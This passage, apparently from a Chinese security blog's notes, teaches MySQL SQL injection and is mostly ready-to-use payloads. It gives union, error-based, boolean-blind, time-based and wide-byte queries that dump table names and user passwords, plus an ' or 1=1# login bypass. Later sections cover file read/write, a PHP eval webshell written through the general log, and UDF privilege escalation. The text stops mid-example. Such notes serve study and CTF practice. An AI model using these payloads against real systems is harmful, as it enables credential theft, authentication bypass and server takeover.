class="hljs-keyword">null</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">-- -</span><br># 查询列名<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select null,user,password from users-- -</span><br><span class="hljs-string"># 查询数据</span><br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>当无法使用<code>union</code>注入时可以尝试报错注入，因为接下来的注入方式要不很麻烦，要不只适用特定场景。</p><p>报错注入就是利用数据库中的某些机制，故意制造错误条件，从而使查询结果出现在错误信息中。</p><p>报错注入需要用到一些函数，这些函数针对不同版本可能失效。</p><blockquote><p><a href="https://xz.aliyun.com/t/253">MYSQL报错注入的一点总结 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_43625917/article/details/101235231">SQL注入-报错注入_Qwzf的博客-CSDN博客</a></p></blockquote><h4 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h4><p>适用条件：mysql版本&gt;5.1.5；通过ExtractValue报错<strong>最多32字符</strong>。</p><p>典型实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(查询语句))))-- -<br><span class="hljs-comment"># </span><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()))))-- -<br><span class="hljs-comment"># 查询当前库</span><br></code></pre></td></tr></table></figure><h4 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h4><p>适用条件：mysql版本&gt;5.1.5；通过UpdateXML报错<strong>最多32字符</strong>。</p><p>典型实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(查询语句),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))<br><span class="hljs-comment"># </span><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select version()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))<br><span class="hljs-comment"># 查询版本</span><br></code></pre></td></tr></table></figure><h4 id="floor函数"><a href="#floor函数" class="headerlink" title="floor函数"></a>floor函数</h4><p>通过floor报错<strong>没有任何字符长度限制</strong>。</p><p>典型实例：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs q">id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(),concat((查询语句),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)-- -<br># <br>id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> user()),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)-- -<br># 查询用户<br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)-- -<br># 爆库<br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)-- -<br># 爆表<br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&quot;TABLE_NAME&quot;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)-- -<br># 爆列<br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> COLUMN_NAME <span class="hljs-keyword">from</span> TABLE_NAME limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)-- -<br># 爆数据<br></code></pre></td></tr></table></figure><h4 id="GeometryCollection函数"><a href="#GeometryCollection函数" class="headerlink" title="GeometryCollection函数"></a>GeometryCollection函数</h4><p>高版本没成功</p><p>典型实例：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">id=<span class="hljs-number">1</span>&#x27; AND <span class="hljs-constructor">GeometryCollection((<span class="hljs-params">select</span> <span class="hljs-operator">*</span> <span class="hljs-params">from</span> (<span class="hljs-params">select</span> <span class="hljs-operator">*</span> <span class="hljs-params">from</span> (<span class="hljs-params">select</span> <span class="hljs-params">user</span>()</span>)a)b))-- -<br></code></pre></td></tr></table></figure><h4 id="polygon函数"><a href="#polygon函数" class="headerlink" title="polygon函数"></a>polygon函数</h4><p>高版本没成功</p><p>典型实例：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&#x27; and polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))-- -<br></code></pre></td></tr></table></figure><h4 id="multipoint函数"><a href="#multipoint函数" class="headerlink" title="multipoint函数"></a>multipoint函数</h4><p>高版本没成功</p><p>典型实例：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&#x27; and multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))-- -<br></code></pre></td></tr></table></figure><h4 id="multilinestring函数"><a href="#multilinestring函数" class="headerlink" title="multilinestring函数"></a>multilinestring函数</h4><p>高版本没成功</p><p>典型实例：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&#x27; and multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))-- -<br></code></pre></td></tr></table></figure><h4 id="multipolygon函数"><a href="#multipolygon函数" class="headerlink" title="multipolygon函数"></a>multipolygon函数</h4><p>高版本没成功</p><p>典型实例：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&#x27; and multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))-- -<br></code></pre></td></tr></table></figure><h4 id="linestring函数"><a href="#linestring函数" class="headerlink" title="linestring函数"></a>linestring函数</h4><p>高版本没成功</p><p>典型实例：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-constructor">LINESTRING((<span class="hljs-params">select</span> <span class="hljs-operator">*</span> <span class="hljs-params">from</span> (<span class="hljs-params">select</span> <span class="hljs-operator">*</span> <span class="hljs-params">from</span> (<span class="hljs-params">select</span> <span class="hljs-params">user</span>()</span>)a)b))-- -<br></code></pre></td></tr></table></figure><h4 id="exp函数"><a href="#exp函数" class="headerlink" title="exp函数"></a>exp函数</h4><p>高版本没成功</p><p>典型实例：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&#x27; and EXP(~(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>())a))-- -<br></code></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>什么情况该用布尔盲注呢？没有回显，根据条件的对错显示不同的内容。</p><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><p>进行布尔盲注可能需要一些函数：</p><ul><li><code>length(str)</code></li><li><code>substr(str, pos, len)</code></li><li><code>left(str, len)</code></li><li><code>right(str, len)</code></li><li><code>mid(str, start, end)</code></li><li><code>ascii(char)</code></li></ul><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>SQL盲注实</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and (length(database()))&gt;10 --+<br><span class="hljs-comment"># 数据库长度</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (ascii(substr(database(),1,1)))&gt;100 --+<br><span class="hljs-comment"># 数据库第一个字符</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (select count(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database())=1-- -<br><span class="hljs-comment"># 表的数量</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> length(substr((select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit 0,1),1))=9-- -<br><span class="hljs-comment"># 第一个表名长度</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (ascii(substr((select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit 0,1),1,1)))&gt;100 --+<br><span class="hljs-comment"># 第一个数据表第一个字符</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (select count(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)=8<br><span class="hljs-comment"># 列的数量</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> length(substr((select column_name <span class="hljs-keyword">from</span> information_schema.columns where table_name= <span class="hljs-string">&#x27;users&#x27;</span> limit 0,1),1))=7-- -<br><span class="hljs-comment"># 第一个列名长度</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (ascii(substr((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> limit 0,1),1,1)))&gt;100 --+<br><span class="hljs-comment"># 第一列名第一个字符</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (ascii(substr((select password <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit 0,1),1,1)))=68--+<br><span class="hljs-comment"># 数据第一个字符</span><br></code></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时注入也是盲注的一种，如果确定是盲注，但是不论对错返回的内容都是相同的，那么就可以尝试延时注入。延时注入是在布尔盲注的基础上，对某个条件设置延时，这样就可以根据相应事件来判断条件的对错。</p><p>延时注入通常适用<code>if</code>，格式为<code>if(条件,为真的操作,为假的操作)</code></p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p>延时注入的典型实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">if</span>(ascii(substr(database(),1,1))&gt;100,sleep(10),<span class="hljs-literal">null</span>))-- -<br><span class="hljs-comment"># 如果条件成立则延时10s</span><br><span class="hljs-comment"># 把布尔盲注的内容放入到条件中</span><br></code></pre></td></tr></table></figure><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>如果设置数据库编码为非英文编码那么就有可能产生宽字节注入。例如说MySql的编码设置为了<code>SET NAMES &#39;gbk&#39;</code>或是 <code>SET character_set_client=gbk</code>，这样配置会引发编码转换从而导致的注入漏洞。</p><p>GBK是一种多字符编码，使用了双字节编码方案。<code>0xD50x5C</code>对应汉字<code>诚</code>，URL编码用百分号加字符的16进制编码表示，所以<code>%d5%5c</code>结果解码后就是<code>诚</code>。</p><p><code>magic_quotes_gpc</code>的作用：当PHP的传参中有特殊字符就会在前面加转义字符<code>\</code>,来做一定的过滤</p><p>比如查询语句为：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><p>如果输入为<code>1&#39;</code>，那么就会自动转换为：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1\&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><code>\</code>的编码为<code>%5c</code>，如果输入为<code>%d5&#39;</code>，那么在进行转换时会变成<code>%d5%5c%27</code>，GBK解码为<code>诚&#39;</code>：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1诚&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>这样就可以闭合了。</p><blockquote><p>如果适用sqlmap，有个tamper为<code>unmagicquotes</code>，可用作宽字节注入。</p></blockquote><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p><blockquote><p><a href="https://www.freebuf.com/articles/web/167089.html">由Three Hit聊聊二次注入 - FreeBuf网络安全行业门户</a></p></blockquote><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>万能密码也是一种注入，通常用于登录功能。</p><blockquote><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">sql注入之万能密码总结_無名之涟的博客-CSDN博客_sql万能密码</a></p></blockquote><p>通常登录时会进行这样的查询：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$pass&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这样的话，如果输入<code>user=&#39; or 1=1#</code>，那么拼接的SQL语句为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>明显<code>username</code>的条件是成立的，而<code>#</code>后面的内容被过滤，所以可以进行查询。</p><h2 id="SQL注入的进一步利用"><a href="#SQL注入的进一步利用" class="headerlink" title="SQL注入的进一步利用"></a>SQL注入的进一步利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>如果有时间就把数据库中的所有数据都看一遍。如果没有时间就看主要的。</p><p>在MySQL中<code>mysql</code>库有一个<code>user</code>表，里面保存了用户信息，有几个关键列主机名<code>Host</code>，用户名<code>User</code>，密码<code>password</code>。</p><blockquote><p>需要注意的是 MySQL 5.7 版本不再使用 <code>Password</code> 来作为密码的字段，而改成了 <code>authentication_string</code>。</p></blockquote><p>密码都是进行加密的，可以尝试进行<strong>爆破</strong>，或者创建一个用户有：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;user&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;user&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> = <span class="hljs-keyword">PASSWORD</span>(<span class="hljs-string">&#x27;newpass&#x27;</span>);<br></code></pre></td></tr></table></figure><p>密码必须用<code>password()</code>加密。或者直接修改已有用户的密码。</p><p>除了系统用户之外，尝试查找<code>users</code>、<code>admin</code>这样的表，如果有后台登录的话用其中的用户登录。</p><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>在MySQL中，适用<code>LOAD_FILE()</code>函数读取一个文件，并将其作为字符串返回。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function">SELECT <span class="hljs-title">LOAD_FILE</span><span class="hljs-params">(<span class="hljs-string">&#x27;/flag&#x27;</span>)</span></span>;<br></code></pre></td></tr></table></figure><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><p>读文件必须满足条件：</p><ul><li>文件绝对路径；</li><li>文件必须在服务器上；</li><li>文件必须是所有人可读的，并且大小小于<code>max_allowed_packet</code>字节，通过<code>SHOW VARIABLES LIKE &#39;max_allowed_packet&#39;;</code>查看；</li><li>当前用户必须拥有FILE权限；授予用户FILE权限：<code>GRANT FILE ON *.* TO &#39;user&#39;@&#39;localhost&#39;;</code></li><li><code>secure_file_priv</code>不为<code>NULL</code>，如果该变量设置了路径，则只能加载指定路径的文件，通过<code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;;</code>查看；</li></ul><blockquote><p>注意<code>secure_file_priv</code>的值，NULL不等于空，如果是NULL表示任何位置都都不能读写，如果为空表示任何位置都可以读写。</p><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p><p>对于<code>secure_file_priv</code>是不可以在数据库中修改的，只能在配置文件中修改，修改后重启才能生效。</p></blockquote><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>在MySQL中，可以进行写文件操作，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;文件内容&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;文件路径&#x27;</span><br><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@basedir</span><br>h<br></code></pre></td></tr></table></figure><h4 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h4><p>写文件必须满足的条件：</p><ul><li>文件绝对路径；</li><li>目标文件必须是个新文件；</li><li>目标目录必须要有可写权限；</li><li>当前用户必须有FILE权限；</li><li><code>secure_fiel_priv</code>不为NULL。</li></ul><p>通过写文件可以直接写入shell进一步攻击。</p><h3 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h3><p>如果<code>secure_file_priv</code>为NULL，可以利用日志写shell。</p><p>在<code>MySQL 5.0</code>版本以上会创建日志文件，可以通过修改日志的全局变量中的存储位置来 getshell。</p><p>通过命令<code>SHOW VARIABLES LIKE &#39;%general%&#39;</code>查看日志配置：</p><ul><li><code>general_log</code>，是否开启日志，默认关闭；</li><li><code>general_log_file</code>，日志保存路径；</li></ul><p>高权限用户可通过命令开启日志记录：<code>set global general_log=&#39;ON&#39;;</code>，也可以修改日志路径：<code>set global general_log_file=&#39;LOG_PATH&#39;;</code>，将日志保存到网站的某个目录下的shell文件中（比如<code>y.php</code>），然后写shell，在数据库中进行查询：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yy&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><p>这样木马就写入到了日志中，然后通过工具进行连接。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote><p> [MySQL提权总结（建议收藏） - 知乎 (zhihu.com)](<a href="https://zhuanlan.zhihu.com/p/411156230#:~:text=%E5%9C%A8%E5%B9%B3%E5%B8%B8%E7%9A%84%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B8%AD%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E5%B8%B8%E5%8F%AF%E4%BB%A5%E5%9C%A8%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%E4%B8%8B%E5%BE%97%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%EF%BC%88%E6%9C%80%E9%AB%98%E6%9D%83%E9%99%90root%EF%BC%89%EF%BC%8C%E5%A6%82%E4%B8%8B%EF%BC%9A">https://zhuanlan.zhihu.com/p/411156230#:~:text=在平常的渗透提权中，我们通常可以在一些特殊情况下得到数据库的用户名和密码（最高权限root），如下：</a> MySQL 3306 端口弱口令爆破 sqlmap 注入的,–sql-shell 模式 网站的数据库配置文件中拿到明文密码信息 CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限)</p></blockquote><h4 id="获得数据库权限"><a href="#获得数据库权限" class="headerlink" title="获得数据库权限"></a>获得数据库权限</h4><p>如何获得数据库权限？</p><ul><li>对3306端口进行账号密码爆破；</li><li>sqlmap的<code>--sql-shell</code>模式；</li><li>通过信息收集（比如配置文件等），拿到明文密码；</li><li>CVE-2012-2122等漏洞。</li></ul><p>CVE-2012-2122在知道数据库用户名的情况下，不断尝试密码就可能登录成功（大约256次）。</p><p>影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>在MySQL中用户可以自定义函数，利用这种方法把自己的动态链接库放在特定目录下来创建自定义函数，实现系统函数命令调用。</p><p>可以利用SQLMap中的UDF动态链接库导入，路径在<code>sqlmap\data\udf\</code>，有针对不同数据库、操作系统的版本，默认的是进行编码处理过的，扩展名后面又个<code>_</code>，可以通过SQLMap的工具进行解码，路径在<code>sqlmap\extra\cloak\cloak.py</code>，使用方法为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"># linux<br>python cloak<span class="hljs-selector-class">.py</span> -d -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[文件路径]</span><span class="hljs-selector-class">.lib_mysqludf_sys</span><span class="hljs-selector-class">.so_</span> -o <span class="hljs-selector-attr">[文件路径]</span><span class="hljs-selector-class">.lib_mysqludf_sys_64</span><span class="hljs-selector-class">.so</span><br># windows<br>python cloak<span class="hljs-selector-class">.py</span> -d -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[文件路径]</span><span class="hljs-selector-class">.lib_mysqludf_sys</span><span class="hljs-selector-class">.dll_</span> -o <span class="hljs-selector-attr">[文件路径]</span><span class="hljs-selector-class">.lib_mysqludf_sys_64</span><span class="hljs-selector-class">.dll</span><br></code></pre></td></tr></table></figure><p>然后动态链接库需要转换为十六进制。</p><p>针对不同的MySQL版本，动态链接库的路径不同：</p><ul><li>在<code>mysql&lt;5.1</code> 导出目录c:&#x2F;windows或system32</li><li>在<code>mysql&gt;=5.1</code> 导出<code>安装目录/lib/plugin/</code>，通过<code>select @@basedir;</code>查看数据库安装路径；如果没有<code>/lib/plugin</code>目录需要创建一个（如果可以的话）；</li></ul><p>接着就可以写数据了：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"># <span 